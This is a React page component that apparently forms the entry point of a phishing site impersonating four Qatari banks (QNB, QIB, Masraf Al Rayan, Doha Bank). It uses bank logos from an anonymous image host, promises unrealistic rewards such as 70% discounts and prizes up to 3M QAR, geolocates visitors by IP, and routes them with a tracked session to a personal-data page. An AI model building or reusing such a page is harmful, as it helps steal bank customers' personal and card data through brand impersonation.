import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Shield, Star } from "lucide-react";

const bankImages = {
  all: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qnb: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
};

const cards = [
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/hxhwkMwt/IMG-20260714-WA0003.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/ZRp4ZFQz/IMG-20260714-WA0002.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/zVfXCPrs/IMG-20260714-WA0004.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/BDhRQrT/IMG-20260714-WA0005.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/PGg2Bw30/IMG-20260714-WA0006.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/0Rg7qXHv/IMG-20260714-WA0007.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/99tzZcZJ/IMG-20260714-WA0001.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/tpKx6xLM/IMG-20260714-WA0000.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/RpGjpb8W/doha-bank-black-card-384x241.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/TMCDtHS7/doha-bank-burgundy-card-384x241-1.jpg" },
];

// صور المميزات الواقعية
const featureImages = {
  parking: "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=400&h=300&fit=crop",
  flight: "https://images.unsplash.com/photo-1436262174933-eb0264dbc15f?w=400&h=300&fit=crop",
  hotel: "https://images.unsplash.com/photo-1631049307264-da0ec9d70304?w=400&h=300&fit=crop",
  car: "https://images.unsplash.com/photo-1552820728-8ac41f1ce891?w=400&h=300&fit=crop",
};

export default function Home() {
  const [, setLocation] = useLocation();
  const { language, setLanguage } = useLanguage();
  const [bankSelect, setBankSelect] = useState("all");
  const [mainCardImage, setMainCardImage] = useState(bankImages.all);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";

  useEffect(() => {
    const fetchCountry = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_name) {
          setUserCountry(data.country_name);
          return;
        }
      } catch (e) {
        console.log("ipapi failed, trying backup...");
      }

      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.country) {
          setUserCountry(data.country);
        }
      } catch (e) {
        console.error("Backup country fetch failed");
      }
    };

    fetchCountry();

    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const updatePage = (bankType: string) => {
    setBankSelect(bankType);
    setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
  };

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    try {
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
      setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
    } catch (error) {
      console.error("Error creating session in DB:", error);
      alert(isArabic ? "فشل بدء الجلسة، يرجى المحاولة مرة أخرى" : "Failed to start session, please try again");
    }
  };

  const goToPersonalData = () => {
    if (bankSelect !== "all") {
      startSession(bankSelect);
    } else {
      alert(isArabic ? "يرجى اختيار البنك أولاً" : "Please select your bank first");
    }
  };

  const handleCardClick = (bank: string) => {
    startSession(bank);
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <div dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #ffffff; border-bottom: 2px solid #8C0032; position: relative; z-index: 1000; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .logo { height: 60px; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background-color: #8C0032; color: #ffffff; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .slider-container { width: 100%; height: 200px; position: relative; overflow: hidden; }
        .slider-container img { width: 100%; height: 100%; object-fit: cover; position: absolute; transition: opacity 1s; opacity: 0; }
        .slider-container img.active { opacity: 1; }
        .dropdown-container { padding: 20px; text-align: center; }
        .dropdown-select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background: white; }
        .card-content-wrapper { padding: 20px; background-color: #ffffff; border-radius: 15px; margin: 0 20px 20px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #8C0032; }
        .card-image { width: 100%; border-radius: 10px; margin-bottom: 15px; }
        .card-content-wrapper h2 { margin: 10px 0; font-size: 18px; color: #333; }
        .card-content-wrapper p { color: #666; font-size: 14px; line-height: 1.5; display: block; margin-bottom: 15px; }
        .apply-btn-main { background: #8C0032; color: white; padding: 15px 40px; border: none; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; display: block; width: 100%; }
        .cards-container { padding: 0 10px 20px 10px; }
        .qnb-card-box { background-color: #ffffff; border-radius: 15px; padding: 0; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; overflow: hidden; }
        .bank-logo { height: 60px; margin: 15px 0; }
        .card-image-qnb { width: 100%; height: 200px; object-fit: cover; }
        .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
        
        /* أنماط المميزات الجديدة */
        .features-grid-professional { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
        .feature-card-professional { position: relative; border-radius: 12px; overflow: hidden; height: 140px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .feature-card-professional img { width: 100%; height: 100%; object-fit: cover; }
        .feature-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 10px; }
        .feature-icon-circle { width: 50px; height: 50px; background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
        .feature-icon-circle svg { width: 28px; height: 28px; color: white; }
        .feature-discount { color: white; font-size: 18px; font-weight: bold; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
        .feature-label { color: white; font-size: 11px; font-weight: 600; text-align: center; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); line-height: 1.2; }
        
        .bottom-features-bar { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; padding: 12px 15px; background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); }
        .bottom-feature-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: white; }
        .bottom-feature-item svg { width: 20px; height: 20px; }
        .bottom-feature-item span { font-size: 10px; font-weight: 600; text-align: center; line-height: 1.2; }
        
        .feature-large-bar { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 12px 15px; display: flex; align-items: center; gap: 10px; margin: 12px 15px; border-radius: 10px; }
        .feature-large-bar svg { width: 28px; height: 28px; flex-shrink: 0; }
        .feature-large-bar span { font-size: 12px; font-weight: 600; }
        
        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; border: none; border-radius: 0; font-size: 16px; font-weight: bold; cursor: pointer; }
        .apply-btn:hover { background-color: #6a0024; }
      `}</style>
      <header className="header">
        <div className="header-right">
          <div className="menu-icon">&#9776;</div>
          <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="logo" />
        </div>
        <div className="header-left">
          <button onClick={toggleLanguage} className="lang-btn">
            {isArabic ? "English" : "العربية"}
          </button>
        </div>
      </header>
      <div className="slider-container">
        <img
          src="https://i.ibb.co/0RwDLqXq/h2-visa-cug-china.jpg"
          className={currentSlide === 0 ? "active" : ""}
          alt="Slide 1"
        />
        <img
          src="https://i.ibb.co/mCKNbdgW/PHL.jpg"
          className={currentSlide === 1 ? "active" : ""}
          alt="Slide 2"
        />
      </div>
      <div className="dropdown-container">
        <select className="dropdown-select" value={bankSelect} onChange={(e) => updatePage(e.target.value)}>
          <option value="all">{isArabic ? "اختر بنكك" : "Select Your Bank"}</option>
          <option value="qnb">{isArabic ? "بنك قطر الوطني (QNB)" : "Qatar National Bank (QNB)"}</option>
          <option value="qib">{isArabic ? "مصرف قطر الإسلامي (QIB)" : "Qatar Islamic Bank (QIB)"}</option>
          <option value="rayan">{isArabic ? "مصرف الريان" : "Masraf Al Rayan"}</option>
          <option value="doha">{isArabic ? "بنك الدوحة" : "Doha Bank"}</option>
        </select>
      </div>
      <div className="card-content-wrapper">
        <img src={mainCardImage} className="card-image" alt="Card Image" />
        <h2>{isArabic ? "أضف بطاقة الدفع لحسابك" : "Add Payment Card to Your Account"}</h2>
        <p>{isArabic ? "أضف بطاقات الدفع من نوع Visa و Mastercard لحساب عضويتك واجمع نقاط أفيوس." : "Add Visa and Mastercard payment cards to your membership account and collect Avios points."}</p>
        <button className="apply-btn-main" onClick={goToPersonalData}>
          {isArabic ? "ابدأ الآن" : "Start Now"}
        </button>
      </div>

      <div className="cards-container">
        {filteredCards.map((card, idx) => (
          <div key={idx} className="qnb-card-box">
            <img src={card.logo} className="bank-logo" alt="Bank Logo" />
            <img src={card.img} className="card-image-qnb" alt="Credit Card" />
            
            {/* شبكة المميزات الرئيسية مع الصور */}
            <div className="features-grid-professional">
              <div className="feature-card-professional">
                <img src={featureImages.parking} alt="Parking" />
                <div className="feature-overlay">
                  <div className="feature-icon-circle">
                    <ParkingCircle />
                  </div>
                  <div>
                    <div className="feature-discount">70%</div>
                    <div className="feature-label">{isArabic ? "المواقف" : "Parking"}</div>
                  </div>
                </div>
              </div>
              
              <div className="feature-card-professional">
                <img src={featureImages.flight} alt="Flight" />
                <div className="feature-overlay">
                  <div className="feature-icon-circle">
                    <Plane />
                  </div>
                  <div>
                    <div className="feature-discount">70%</div>
                    <div className="feature-label">{isArabic ? "تذاكر الطيران" : "Flights"}</div>
                  </div>
                </div>
              </div>
              
              <div className="feature-card-professional">
                <img src={featureImages.hotel} alt="Hotel" />
                <div className="feature-overlay">
                  <div className="feature-icon-circle">
                    <Hotel />
                  </div>
                  <div>
                    <div className="feature-discount">70%</div>
                    <div className="feature-label">{isArabic ? "حجوزات الفنادق" : "Hotels"}</div>
                  </div>
                </div>
              </div>
              
              <div className="feature-card-professional">
                <img src={featureImages.car} alt="Car Rental" />
                <div className="feature-overlay">
                  <div className="feature-icon-circle">
                    <Car />
                  </div>
                  <div>
                    <div className="feature-discount">70%</div>
                    <div className="feature-label">{isArabic ? "تأجير السيارات" : "Car Rental"}</div>
                  </div>
                </div>
              </div>
            </div>

            {/* شريط المميزات الإضافية */}
            <div className="bottom-features-bar">
              <div className="bottom-feature-item">
                <Shield />
                <span>{isArabic ? "دفع آمن" : "Secure Payment"}</span>
              </div>
              <div className="bottom-feature-item">
                <Globe />
                <span>{isArabic ? "تقبل عالمياً" : "Global Acceptance"}</span>
              </div>
              <div className="bottom-feature-item">
                <Gift />
                <span>{isArabic ? "مميزات حصرية" : "Exclusive Benefits"}</span>
              </div>
            </div>

            {/* الكاش باك والجوائز */}
            <div className="feature-large-bar">
              <Wallet />
              <span>{isArabic ? "كاش باك حتى 5000 ريال شهرياً" : "Cashback Up to 5000 QAR Monthly"}</span>
            </div>

            <div className="feature-large-bar">
              <Crown />
              <span>{isArabic ? "دخول صالات VIP في المطارات" : "VIP Lounge Access"}</span>
            </div>

            <div className="feature-large-bar">
              <Trophy />
              <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال" : "Annual Rewards Up to 3M QAR"}</span>
            </div>

            <button className="apply-btn" onClick={() => handleCardClick(card.bank)}>
              {isArabic ? "اطلبها الآن" : "Order Now"}
            </button>
          </div>
        ))}
      </div>
      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
    </div>
  );
}
